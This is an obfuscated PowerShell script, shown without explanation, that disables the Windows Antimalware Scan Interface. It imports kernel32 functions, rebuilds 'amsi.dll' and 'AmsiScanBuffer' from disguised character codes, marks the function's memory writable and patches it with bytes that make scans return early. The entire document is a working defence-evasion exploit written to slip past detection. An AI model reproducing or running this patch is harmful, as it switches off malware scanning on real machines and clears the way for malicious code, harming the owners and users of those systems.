$OB57T = @"
using System;
using System.Runtime.InteropServices;
public class OB57T {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr ONKLEfXr9WexrElTCQs8, string H6aa1O3);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr CmlYrPIVVOfZPvPBg_Rz, UIntPtr QRTCW, uint T7_MKMf, out uint RpZaPfUPOWb7evpxkb);
}
"@

Add-Type $OB57T

$Hyd8MF4JQA1ZQE = [OB57T]::LoadLibrary("$([ChAr]([byte]0x61)+[chAr]([BYte]0x6d)+[cHAR](39+76)+[Char]([bYTe]0x69)+[cHAR](39+7)+[chaR]([BytE]0x64)+[ChAr]([BYtE]0x6c)+[ChAR](108*73/73))")
$DmOes0XZRagM = [OB57T]::GetProcAddress($Hyd8MF4JQA1ZQE, "$(('ÀmsîScânBú'+'ffér').NoRMalIZe([char]([Byte]0x46)+[chaR](111)+[cHAr](26+88)+[chAR](85+24)+[cHaR]([bYtE]0x44)) -replace [CHaR](92)+[Char]([byTe]0x70)+[CHaR]([bYTE]0x7b)+[CHar]([BYtE]0x4d)+[cHar]([bYTe]0x6e)+[CHar](90+35))")
$p = 0
[OB57T]::VirtualProtect($DmOes0XZRagM, [uint32]5, 0x40, [ref]$p)
$XnUyyNHESAbecEMP = "0xB8"
$scnHgqL3W0EOm2Qjl8N = "0x57"
$aN2nPUiC = "0x00"
$QMAaH5LmmOMnsONQhQB = "0x07"
$dDTr0wS = "0x80"
$qzG5r0dMpei = "0xC3"
$VJBVzxFC = [Byte[]] ($XnUyyNHESAbecEMP,$scnHgqL3W0EOm2Qjl8N,$aN2nPUiC,$QMAaH5LmmOMnsONQhQB,+$dDTr0wS,+$qzG5r0dMpei)
[System.Runtime.InteropServices.Marshal]::Copy($VJBVzxFC, 0, $DmOes0XZRagM, 6)